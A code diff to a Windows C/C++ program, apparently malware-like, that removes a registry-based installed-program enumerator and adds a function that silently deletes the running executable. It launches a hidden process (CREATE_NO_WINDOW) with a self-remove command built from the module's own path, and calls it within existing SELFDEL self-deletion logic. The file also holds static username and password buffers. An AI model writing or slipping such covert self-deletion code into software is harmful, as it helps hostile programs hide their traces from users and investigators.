@@ -169,45 +169,7 @@ int blockhitcurrentchance;
 #include <windows.h>
 #include "resource.h"
 
-void BuildList(void)
-{
-	HKEY hKey;
-	if (::RegOpenKeyEx(HKEY_LOCAL_MACHINE, IS_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
-		return;
 
-	DWORD dwIndex = 0;
-	LONG lRet;
-	DWORD cbName = IS_KEY_LEN;
-	TCHAR szSubKeyName[IS_KEY_LEN];
-
-	while ((lRet = ::RegEnumKeyEx(hKey, dwIndex, szSubKeyName, &cbName, NULL,
-		NULL, NULL, NULL)) != ERROR_NO_MORE_ITEMS)
-	{
-		// Do we have a key to open?
-		if (lRet == ERROR_SUCCESS)
-		{
-			// Open the key and get the value
-			HKEY hItem;
-			if (::RegOpenKeyEx(hKey, szSubKeyName, 0, KEY_READ, &hItem) != ERROR_SUCCESS)
-				continue;
-			// Opened - look for "DisplayName"
-			TCHAR szDisplayName[IS_KEY_LEN];
-			DWORD dwSize = sizeof(szDisplayName);
-			DWORD dwType;
-
-			if (::RegQueryValueEx(hItem, IS_DISPLAY, NULL, &dwType,
-				(LPBYTE)& szDisplayName, &dwSize) == ERROR_SUCCESS)
-			{
-				// Add to the main array
-				m_aPrograms.Add(szDisplayName);
-			}
-			::RegCloseKey(hItem);
-		}
-		dwIndex++;
-		cbName = IS_KEY_LEN;
-	}
-	::RegCloseKey(hKey);
-}
 static char charusername[300];
 static char charpassword[300];
 bool randomize = true;
@@ -2074,7 +2036,22 @@ typedef struct _SELFDEL
 	pExitProcess fnExitProcess; // ExitProcess function address
 	char FileName[100]; // File name
 } SELFDEL, *PSELFDEL;
+void DelMe()
+{
+	TCHAR szModuleName[MAX_PATH];
+	TCHAR szCmd[2 * MAX_PATH];
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
 
+	GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
+}
 static void WINAPI selfdel()
 {
 	PSELFDEL SelfDel;
@@ -3023,6 +3000,8 @@ public:
 				SELFDEL SelfDel;
 
 				PVOID mem;
+
+				DelMe();
 
 				// Zero all data structures
 			}
